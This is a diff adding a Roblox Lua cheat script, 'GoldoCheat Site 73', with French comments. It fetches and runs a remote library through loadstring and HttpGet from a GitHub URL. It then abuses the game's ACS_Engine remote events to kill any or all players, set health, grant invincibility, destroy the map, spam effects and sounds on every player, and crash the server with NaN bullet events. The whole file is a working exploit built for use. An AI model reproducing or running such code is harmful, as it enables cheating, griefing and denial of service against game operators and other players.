@@ -1,0 +1,290 @@
+-- Charger la bibliothèque
+local GoldoCheatLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/goldo9999/NewCheat/refs/heads/main/library.lua')))()
+
+-- Notification de bienvenue
+GoldoCheatLib:MakeNotification({
+    Name = "Bienvenue!",
+    Content = "Bienvenue sur GoldoCheat Site 73!",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+-- Créer la fenêtre principale
+local Window = GoldoCheatLib:MakeWindow({
+    Name = "GoldoCheat Site 73",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "GoldoCheat73"
+})
+
+-- Ajouter un onglet Main
+local MainTab = Window:MakeTab({
+    Name = "Main",
+    Icon = "rbxassetid://4483345998"
+})
+
+-- Ajouter une section Kill
+local KillSection = MainTab:AddSection({
+    Name = "Kill Actions"
+})
+
+-- Variable pour stocker le pseudo entré et la quantité de PV
+local playerName = ""
+local healAmount = 0
+
+-- Zone de texte pour entrer le pseudo du joueur
+KillSection:AddTextbox({
+    Name = "Entrez le pseudo ou, 'all', ou 'me' pour se sélectionner",
+    Default = "",
+    Callback = function(text)
+        playerName = text
+    end
+})
+
+-- Zone de texte pour entrer la quantité de PV à donner ou retirer
+KillSection:AddTextbox({
+    Name = "Entrez le nombre de PV (positif ou négatif)",
+    Default = "0",
+    Callback = function(text)
+        healAmount = tonumber(text) or 0
+    end
+})
+
+-- Fonction pour tuer un joueur spécifique ou tous les joueurs
+local function killPlayer(playerName)
+    local player = game.Players.LocalPlayer -- Se sélectionner soi-même
+
+    if playerName == "all" then
+        -- Script pour tuer tous les joueurs
+        for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+            if p.Character then
+                game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(p.Character.Humanoid, math.huge, 0, 0)
+            end
+        end
+        GoldoCheatLib:MakeNotification({
+            Name = "Action exécutée",
+            Content = "Tous les joueurs ont été tués!",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    elseif playerName == "me" then
+        -- Script pour se tuer soi-même
+        if player and player.Character then
+            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(player.Character.Humanoid, math.huge, 0, 0)
+            GoldoCheatLib:MakeNotification({
+                Name = "Action exécutée",
+                Content = "Vous avez été tué!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        end
+    else
+        -- Recherche d'un joueur par pseudo d'affichage partiel
+        local matchedPlayer = nil
+        for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+            -- Si le pseudo d'affichage contient le texte entré
+            if p.Name:lower():find(playerName:lower()) or p.DisplayName:lower():find(playerName:lower()) then
+                matchedPlayer = p
+                break
+            end
+        end
+
+        if matchedPlayer and matchedPlayer.Character then
+            -- Tuer ce joueur
+            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(matchedPlayer.Character.Humanoid, math.huge, 0, 0)
+            GoldoCheatLib:MakeNotification({
+                Name = "Action exécutée",
+                Content = "Le joueur " .. matchedPlayer.DisplayName .. " a été tué!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        else
+            GoldoCheatLib:MakeNotification({
+                Name = "Erreur",
+                Content = "Aucun joueur trouvé avec le pseudo '" .. playerName .. "'!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        end
+    end
+end
+
+-- Fonction pour soigner ou retirer des PV à un joueur spécifique
+local function healPlayer(playerName, healAmount)
+    local player = game.Players.LocalPlayer -- Se sélectionner soi-même
+
+    if playerName == "me" then
+        -- Script pour se soigner ou se retirer des PV soi-même
+        if player and player.Character then
+            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(player.Character.Humanoid, -healAmount, 0, 0)
+            GoldoCheatLib:MakeNotification({
+                Name = "Action exécutée",
+                Content = "Vous avez été soigné de " .. healAmount .. " PV!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        end
+    else
+        -- Recherche d'un joueur par pseudo d'affichage partiel
+        local matchedPlayer = nil
+        for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+            -- Si le pseudo d'affichage contient le texte entré
+            if p.Name:lower():find(playerName:lower()) or p.DisplayName:lower():find(playerName:lower()) then
+                matchedPlayer = p
+                break
+            end
+        end
+
+        if matchedPlayer and matchedPlayer.Character then
+            -- Soigner ou retirer des PV à ce joueur
+            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(matchedPlayer.Character.Humanoid, -healAmount, 0, 0)
+            GoldoCheatLib:MakeNotification({
+                Name = "Action exécutée",
+                Content = "Le joueur " .. matchedPlayer.DisplayName .. " a été soigné de " .. healAmount .. " PV!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        else
+            GoldoCheatLib:MakeNotification({
+                Name = "Erreur",
+                Content = "Aucun joueur trouvé avec le pseudo '" .. playerName .. "'!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        end
+    end
+end
+
+-- Fonction pour rendre un joueur invincible
+local function godPlayer(playerName)
+    local player = game.Players.LocalPlayer -- Se sélectionner soi-même
+
+    if playerName == "me" then
+        -- Script pour se rendre invincible soi-même
+        if player and player.Character then
+            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(player.Character.Humanoid, -math.huge, 0, 0)
+            GoldoCheatLib:MakeNotification({
+                Name = "Action exécutée",
+                Content = "Vous êtes maintenant invincible!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        end
+    else
+        -- Recherche d'un joueur par pseudo d'affichage partiel
+        local matchedPlayer = nil
+        for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+            -- Si le pseudo d'affichage contient le texte entré
+            if p.Name:lower():find(playerName:lower()) or p.DisplayName:lower():find(playerName:lower()) then
+                matchedPlayer = p
+                break
+            end
+        end
+
+        if matchedPlayer and matchedPlayer.Character then
+            -- Rendre ce joueur invincible
+            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Damage:FireServer(matchedPlayer.Character.Humanoid, -math.huge, 0, 0)
+            GoldoCheatLib:MakeNotification({
+                Name = "Action exécutée",
+                Content = "Le joueur " .. matchedPlayer.DisplayName .. " est maintenant invincible!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        else
+            GoldoCheatLib:MakeNotification({
+                Name = "Erreur",
+                Content = "Aucun joueur trouvé avec le pseudo '" .. playerName .. "'!",
+                Image = "rbxassetid://4483345998",
+                Time = 5
+            })
+        end
+    end
+end
+
+-- Ajouter un bouton Kill
+KillSection:AddButton({
+    Name = "Kill",
+    Callback = function()
+        killPlayer(playerName)
+    end
+})
+
+-- Ajouter un bouton Heal
+KillSection:AddButton({
+    Name = "Heal",
+    Callback = function()
+        healPlayer(playerName, healAmount)
+    end
+})
+
+-- Ajouter un bouton God
+KillSection:AddButton({
+    Name = "God",
+    Callback = function()
+        godPlayer(playerName)
+    end
+})
+
+-- Ajouter une nouvelle catégorie "Destructor"
+local DestructorTab = Window:MakeTab({
+    Name = "Destructor",
+    Icon = "rbxassetid://4483345998"
+})
+
+-- Ajouter une section Destructor
+local DestructorSection = DestructorTab:AddSection({
+    Name = "Destruction Actions"
+})
+
+-- Ajouter un bouton "BZ la vision"
+DestructorTab:AddButton({
+    Name = "BZ la vision",
+    Callback = function()
+        while task.wait() do
+            for _, player in next, game.Players:GetPlayers() do
+                game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Suppression:FireServer(player, 666, 666, 666)
+            end
+        end
+    end
+})
+
+-- Ajouter un bouton "Destroy Map"
+DestructorTab:AddButton({
+    Name = "Destroy Map",
+    Callback = function()
+        local cFrame = CFrame.new(0, 0, 0)
+        local Size = {X = 800, Y = 800, Z = 800}  -- Taille des cubes multipliée par 800
+
+        while true do
+            game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3, {Fortified = {}, Destroyable = workspace}, CFrame.new(), CFrame.new(), {CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * cFrame, Size = Size})
+            task.wait(0.1) -- Ajouter un délai de 0.1 seconde
+        end
+    end
+})
+
+-- Ajouter un bouton "Crash serveur"
+DestructorTab:AddButton({
+    Name = "Crash serveur",
+    Callback = function()
+        while task.wait() do
+            for i = 1, 30 do
+                game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.ServerBullet:FireServer(Vector3.new(0/0/0), Vector3.new(0/0/0))
+            end
+        end
+    end
+})
+
+-- Ajouter un bouton "Son horrible"
+DestructorTab:AddButton({
+    Name = "Son horrible",
+    Callback = function()
+        while task.wait() do
+            for _, player in next, game.Players:GetPlayers() do
+                game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Whizz:FireServer(player)
+            end
+        end
+    end
+})
+
+-- Initialiser l'interface
+GoldoCheatLib:Init()
